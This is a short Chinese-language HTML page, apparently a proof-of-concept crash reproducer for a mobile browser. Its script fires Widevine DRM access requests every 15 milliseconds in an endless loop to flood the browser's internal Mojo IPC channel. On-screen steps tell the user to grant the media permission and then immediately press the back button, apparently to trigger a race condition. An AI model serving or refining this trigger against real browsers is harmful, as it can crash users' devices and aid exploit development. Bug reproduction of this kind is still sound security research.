<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>加特林压测模式</title>
</head>
<body style="background: #111; color: #fff; text-align: center; padding-top: 50px; font-family: sans-serif;">
    <h2 style="color: #FF3B30;">⚠️ 加特林无限轰炸模式已启动 </h2>
    <p>正在以每 15 毫秒/次的频率轰击底层媒体服务...</p>

    <p style="color: #FF9500; font-weight: bold; font-size: 18px;">【复现核心操作】</p>
    <p style="padding: 10px; background: #222; border-radius: 8px; display: inline-block;">
        1. 如果弹出媒体权限，请点击“允许”<br>
        2. 点击允许后，立刻、马上、疯狂地按下手机的【返回键】关闭本页面！
    </p>

    <script>
        window.onload = function() {
            // 用 setInterval 代替 setTimeout，变成无限循环发包
            setInterval(function() {
                if (navigator.requestMediaKeySystemAccess) {
                    // 疯狂发射 Widevine 请求，把底层 Mojo 通道塞满
                    navigator.requestMediaKeySystemAccess('com.widevine.alpha', [{
                        initDataTypes: ['cenc'],
                        videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"' }]
                    }]);
                }
            }, 15); // 15毫秒一次，高频轰炸
        };
    </script>
</body>
</html>
